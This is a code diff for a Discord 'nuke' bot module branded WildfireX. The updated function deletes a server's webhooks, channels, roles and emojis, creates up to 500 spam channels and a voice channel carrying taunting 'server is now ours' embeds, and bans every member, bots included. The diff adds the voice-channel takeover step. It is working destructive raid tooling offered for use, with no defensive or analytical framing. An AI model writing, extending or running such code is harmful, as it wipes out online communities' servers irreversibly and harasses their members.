@@ -1,13 +1,12 @@
 // src/commands/nuke.js
-// Core nuke logic — exported as a plain async function.
-// Called by the znuke prefix command in index.js.
+// Core nuke logic — exported as plain async functions.
 
-import { EmbedBuilder } from 'discord.js';
+import { EmbedBuilder, ChannelType } from 'discord.js';
 
-// ─── Build the nuke announcement embed ────────────────────────────────────────
+// ─── Build the nuke announcement embed (posted in spam text channels) ─────────
 export function buildNukeEmbed(channelName) {
   return new EmbedBuilder()
-    .setColor(0xff0000)  // pure red
+    .setColor(0xff0000)
     .setTitle('💥 SERVER NUKED')
     .setDescription('This server has been nuked by WildfireX')
     .addFields(
@@ -25,35 +24,66 @@ export function buildNukeEmbed(channelName) {
     .setFooter({ text: 'WildfireX Security' });
 }
 
-// ─── Helpers ──────────────────────────────────────────────────────────────────
+// ─── Build the VC nuke announcement embed (posted in the voice channel chat) ──
+export function buildVcNukeEmbed() {
+  return new EmbedBuilder()
+    .setColor(0xff0000)
+    .setTitle('☢️ WILDFIRE HAS LANDED')
+    .setDescription(
+      '> This server has been reduced to **ash** by **WildfireX**.\n' +
+      '> We are now occupying your comms. There is no escape.',
+    )
+    .addFields(
+      { name: '🔥 Status',    value: '`NUKED — TOTAL ANNIHILATION`', inline: false },
+      { name: '👑 Authority', value: 'WildfireX Security',           inline: true  },
+      { name: '📡 Position',  value: '`Wildfire Base — VC`',         inline: true  },
+      {
+        name: '🕒 Timestamp',
+        value: new Date().toLocaleString('en-GB', {
+          weekday: 'long', year: 'numeric', month: 'long',
+          day: 'numeric', hour: '2-digit', minute: '2-digit',
+        }),
+        inline: false,
+      },
+    )
+    .setFooter({ text: 'WildfireX — This server is now ours.' })
+    .setTimestamp();
+}
 
-/**
- * Run an array of async tasks in parallel, collect results.
- * Uses allSettled so one failure doesn't abort the rest.
- */
+// ─── Helpers ──────────────────────────────────────────────────────────────────
 async function runAll(tasks) {
-  const results = await Promise.allSettled(tasks);
+  const results   = await Promise.allSettled(tasks);
   const succeeded = results.filter((r) => r.status === 'fulfilled').length;
   const failed    = results.filter((r) => r.status === 'rejected').length;
   return { succeeded, failed };
 }
 
 // ─── Main wipe logic ──────────────────────────────────────────────────────────
-
 /**
- * Wipes a Discord guild: webhooks → channels → roles → emojis → members (ban all, including bots).
- * @param {import('discord.js').Guild} guild   The target guild object.
- * @param {string}                    botId   The bot's own user ID (to skip itself only).
- * @param {number}                    channelsToCreate  How many spam channels to create.
- * @param {string}                    channelName       Name for the spam channels.
- * @returns {Promise<string[]>}                Log lines describing what happened.
+ * Wipes a Discord guild: webhooks → channels → roles → emojis → VC (opt) → spam channels → bans.
+ *
+ * @param {import('discord.js').Guild} guild            Target guild.
+ * @param {string}                    botId             Bot's own user ID (skipped during bans).
+ * @param {number}                    channelsToCreate  Total channels to create (VC counts as 1).
+ * @param {string}                    channelName       Name for spam channels.
+ * @param {boolean}                   createVc          Whether to create a Voice Channel at the top.
+ * @param {string}                    vcName            Name for the Voice Channel.
+ * @returns {Promise<{ log: string[], vcChannel: import('discord.js').VoiceChannel | null }>}
  */
-export async function nukeServer(guild, botId, channelsToCreate = 0, channelName = 'nuked') {
+export async function nukeServer(
+  guild,
+  botId,
+  channelsToCreate = 0,
+  channelName      = 'nuked',
+  createVc         = false,
+  vcName           = 'wildfire-base',
+) {
   const log = [];
+  let vcChannel = null;
 
   // 1. Webhooks
   {
-    const channels = guild.channels.cache.filter(
+    const channels     = guild.channels.cache.filter(
       (c) => c.isTextBased && typeof c.fetchWebhooks === 'function',
     );
     const webhookTasks = [];
@@ -91,10 +121,30 @@ export async function nukeServer(guild, botId, channelsToCreate = 0, channelName
     log.push(`😀 **Emojis** — deleted \`${succeeded}\`, failed \`${failed}\``);
   }
 
-  // 5. Spam channels creation + post nuke embed in each
+  // 5. Voice Channel creation (if requested)
+  //    Reserve 1 slot from channelsToCreate for the VC; remaining go to text.
+  if (createVc) {
+    const textCount  = Math.max(channelsToCreate - 1, 0);
+    channelsToCreate = textCount; // hand-off to step 6
+    try {
+      vcChannel = await guild.channels.create({
+        name: vcName,
+        type: ChannelType.GuildVoice,
+        position: 0,
+      });
+      await vcChannel.setPosition(0, { relative: false }).catch(() => {});
+      // Post the nuke embed in the VC's built-in text chat
+      await vcChannel.send({ embeds: [buildVcNukeEmbed()] }).catch(() => {});
+      log.push(`🔊 **Voice Channel** — \`${vcChannel.name}\` created at top`);
+    } catch (err) {
+      log.push(`🔊 **Voice Channel** — failed: \`${err.message}\``);
+    }
+  }
+
+  // 6. Spam channels creation + post nuke embed in each
   if (channelsToCreate > 0) {
-    const count = Math.min(channelsToCreate, 500);
-    const embed = buildNukeEmbed(channelName);
+    const count      = Math.min(channelsToCreate, 500);
+    const embed      = buildNukeEmbed(channelName);
     const createTasks = Array.from({ length: count }, async () => {
       try {
         const ch = await guild.channels.create({ name: channelName });
@@ -109,16 +159,15 @@ export async function nukeServer(guild, botId, channelsToCreate = 0, channelName
     log.push(`📣 **Spam Channels Created** — \`${succeeded}\` created, failed \`${failed}\``);
   }
 
-  // 6. Members — BAN ALL (including bots), skip the bot itself only
+  // 7. Members — BAN ALL (including bots), skip the bot itself only
   {
     let membersFetched = true;
     await guild.members.fetch().catch((err) => {
-      console.warn('[nuke] Could not fetch members (missing Server Members Intent?):', err.message);
+      console.warn('[nuke] Could not fetch members:', err.message);
       membersFetched = false;
     });
 
     if (membersFetched) {
-      // Include bots — only skip the nuke bot itself
       const members = guild.members.cache.filter((m) => m.id !== botId);
       const tasks   = members.map((m) =>
         m.ban({ reason: 'Server nuke' }).catch(() => {}),
@@ -132,5 +181,5 @@ export async function nukeServer(guild, botId, channelsToCreate = 0, channelName
     }
   }
 
-  return log;
+  return { log, vcChannel };
 }
